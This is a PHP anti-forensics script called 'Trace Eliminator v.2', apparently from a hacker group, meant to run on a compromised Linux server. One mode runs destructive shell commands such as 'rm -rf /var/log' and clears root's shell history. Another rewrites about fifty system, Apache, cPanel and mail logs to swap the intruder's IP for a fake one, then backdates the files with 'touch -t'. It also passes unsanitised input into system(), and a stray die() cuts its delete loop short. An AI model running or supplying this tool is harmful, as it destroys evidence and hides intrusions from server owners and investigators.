<?php
/*
#+----------------------------+
#| Trace Eliminator v.2 2012  |
#| - edited in 2014.          |
#+----------------------------+
#| By: Hannibal Ksa (HK)      |
#| www.r00t3rz.com            |
#+----------------------------+

    NOTE!! :
    Use these scripts entirely at your own risk.
    The author cannot be held responsible for any damage, direct nor consequential,
    caused by the use of, or inability to use the techniques or scripts presented here.

   " AND THIS FILE IS UNDER The GNU General Public License v3.0 "
*/

##################################
# Windows's Version (NO-COLORS!) #
##################################

error_reporting(0);
set_time_limit(0);
print "

                   +==+7
                ========I
               =========
       ====+  7=========    I ==
     ======== +========  =========
   ==================== ==========
  ==========? ========I==========
  ==========  =======7I==========
  =========7    ?==?  =========
  I========     += +  I========
    ===     =========I  ======   7?
       ===============7     =========
    ==================   ============
   ?==================? =============
   ===================  ============
   ==================== 7==========
    ================== I ========+
     ===================  =====+
      ===================  =?
        ================?
          =========??==
              ====I=      Trace Eliminator v.2

    # By: Hannibal Ksa (HK)
    @r00t3rz - r00t3rz.com


";
if($argc < 2){ # no option
die("[#] Usage : php ".$argv[0]." [OPTIONS]\n[!] Try : php ".$argv[0]." -h for more options.\n\n"); # show how it'z works and exit
} elseif ($argv[1] == "-h" or $argv[1] == "--help" or $argv[1] == "help"){ # check if enter the help command not the ip
print "Usage: php ".$argv[0]." [OPTIONS]\n
Options:
   -c, --clean            Replace your IP-Adress in log file'z with a Fake-IP-Adress.
   -d, --delete           Delete the history & log file'z. (not recommended/Suspicious)
   -h, --help             This shitty message.

   Option \"-c\" Usage : php ".$argv[0]." -c <IP> <FAKE-IP> <FAKE-DATE>
               E.x   : php ".$argv[0]." -c 127.0.0.1 123.4.5.6 199001011212.43

     The <FAKE-DATE> form is: [[CC]YY]MMDDhhmm[.ss]
      E.x : 199001011212.43
           > 1990 is the Century and Year/s ([[CC]YY])
           > 0101 is the Month and Day (MMDD)
           > 1212 is the Hour/s and the Minute/s (hhmm)
           > .43  is the Second/s (.ss)\n\n";
sleep(1);
die(); # exit
} elseif ($argv[1] == "-d" or $argv[1] == "--delete" or $argv[1] == "delete"){ # check if enter the help command not the ip
$delete = array('history -c','rm .bash_history','rm -rf /tmp/logs','rm -rf $HISTFILE','rm -rf /root/.ksh_history','rm -rf /root/.bash_history','rm -rf /root/.ksh_history','rm -rf /root/.bash_logout','rm -rf /usr/local/apache/logs','rm -rf /usr/local/apache/log','rm -rf /var/apache/logs','rm -rf /var/apache/log','rm -rf /var/run/utmp','rm -rf /var/logs ','rm -rf /var/log','rm /etc/httpd/logs/*','rm /usr/local/cpanel/logs/*');
print "\n\n\033[1;31m[!] Deleting ..\n\n";
sleep(2);
foreach ($delete as $del){
$doit = system($del);
if($doit == true){
echo "\n[+] \"$del\" -> Deleted !"; # print the log that has been cleaned
sleep(1);
} else { # if isn't cleaned
echo "\n[-] ERROR! while deleting \"$del\"\n"; # print the log that has not been cleaned
sleep(1);
}
print "\n\n[!] Bye ...\n\n";
die(); # exit
}
} elseif ($argv[1] == "-c" or $argv[1] == "--clean" or $argv[1] == "clean") {
$ip = $argv[2]; # set the ip
$fakeip = $argv[3]; # set the fake ip
$fakedate = $argv[4]; # set the fake date for the logs
if($ip == false){ # check if enterd the ip
print "\n\[!] Plz enter your IP.\n\n";
sleep(1);
die(); # exit
} elseif ($fakeip == false){ # check if enterd the fake ip
print "\n\n[!] Plz enter the Fake IP.\n\n";
sleep(1);
die(); # exit
} elseif ($fakedate == false){ # check if enterd the fake date
print "\n\n[!] Plz enter the Fake Date.\n\n";
sleep(1);
die(); # exit
} else {
/*
Logs files (name/path) edit and/or add
*/
$logs = array('/etc/httpd/logs/access_log','/etc/httpd/logs/access_log.1','/etc/httpd/logs/access_log.2','/etc/httpd/logs/access_log.3','/etc/httpd/logs/access_log.4','/etc/httpd/logs/error_log','/etc/httpd/logs/error_log.1','/etc/httpd/logs/error_log.2','/etc/httpd/logs/error_log.3','/etc/httpd/logs/error_log.4','/usr/local/apache/logs/error_log','/usr/local/apache/logs/suexec_log','/etc/httpd/logs/modsec_audit.log','/etc/httpd/logs/modsec_debug.log','/var/log/httpd/error_log','/var/log/apache2/error.log','/var/log/httpd-error.log','/usr/local/cpanel/logs/error_log','/usr/local/cpanel/logs/license_log','/usr/local/cpanel/logs/stats_log','/usr/local/cpanel/logs/access_log','/var/log/auth.log','/var/log/kern.log','/var/log/cron.log','/var/log/boot.log','/var/log/mysqld.log','/var/log/secure','/var/log/utmp','/var/log/wtmp','/var/log/yum.log','/var/log/Xorg.0.log','/var/log/wvdialconf.log','/var/log/user.log','/var/log/pycentral.log','/var/log/mail.log','/var/log/apport.log','/var/log/auth.log','/var/bootstrap.log','/var/log/daemon.log','/var/log/dpkg.log','/var/log/fontconfig.log','/var/log/lpr.log','/var/log/chkservd.log','/var/log/exim_mainlog','/var/log/exim/mainlog','/var/log/exim_rejectlog','/var/log/exim/rejectlog','/var/log/maillog','/var/log/messages','/usr/local/apache/domlogs/ftpxferlog','/var/log/xferlog','/var/log/nctfpd.errs','/var/log/httpsd/ssl.access_log','/var/log/ncftpd/misclog.txt','/var/log/nctfpd.errs');
/*
ex:
$logs = array('1.log','2.log','3.log','4.log'); # when we were testing it in the l4pz
*/
foreach($logs as $log){
$file = file_get_contents($log); # read the log'z
$file = str_replace($ip, $fakeip, $file); # replace your ip with the fake ip
file_put_contents($log, $file); # save it
if($file == true){ # if is cleaned
echo "\n\n[+] \"$log\" -> Cleaned !\n"; # print the log that has been cleaned
sleep(1);
} else { # if isn't cleaned
echo "\n[!] ERROR! while cleaning : \"$log\"\n"; # print the log that couldn't be cleaned
sleep(1);
}
$fakeit = @system("touch -t $fakedate $log");
if($fakeit){
echo "\n[+] \"$log\" -> Date changed !\n"; # print the log that has been fakeed
sleep(1);
} else {
echo "[-] ERROR while changing date : \"$log\"\n"; # print the log that couldn't be faked
sleep(1);
}
}
print "\n\n[!] Bye ...\n\n";
die(); # exit
}
}
?>
